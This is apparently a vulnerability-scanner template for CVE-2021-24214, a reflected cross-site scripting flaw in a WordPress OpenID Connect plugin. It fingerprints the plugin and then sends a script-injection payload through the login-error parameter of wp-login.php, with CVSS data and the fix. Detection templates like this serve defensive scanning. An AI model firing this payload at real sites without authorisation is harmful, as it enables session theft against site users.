flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - OpenID Connect Generic Client
  raw:
  - 'GET /wp-content/plugins/daggerhart-openid-connect-generic/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'ERROR (<script>alert(document.domain)</script>):'
    - Login with OpenID Connect
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-login.php?login-error=<script>alert(document.domain)</script>'
id: CVE-2021-24214
info:
  author: tess
  classification:
    cpe: cpe:2.3:a:daggerhartlab:openid_connect_generic_client:3.8.0:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24214
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.88145
    epss-score: 0.04044
  description: WordPress OpenID Connect Generic Client plugin 3.8.0 and 3.8.1 contains
    a cross-site scripting vulnerability. It does not sanitize the login error when
    output back in the login form, thereby not requiring authentication, which can
    be exploited with the default configuration.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: openid_connect_generic_client
    vendor: daggerhartlab
    verified: true
  name: WordPress OpenID Connect Generic Client 3.8.0-3.8.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/31cf0dfb-4025-4898-a5f4-fc7115565a10
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24214
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24214
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update to the latest version of the WordPress OpenID Connect Generic
    Client plugin (3.8.2) to fix this vulnerability.

    '
  severity: medium
  tags: cve2021,cve,wpscan,wordpress,xss,wp-plugin,wp,openid,daggerhartlab,vuln
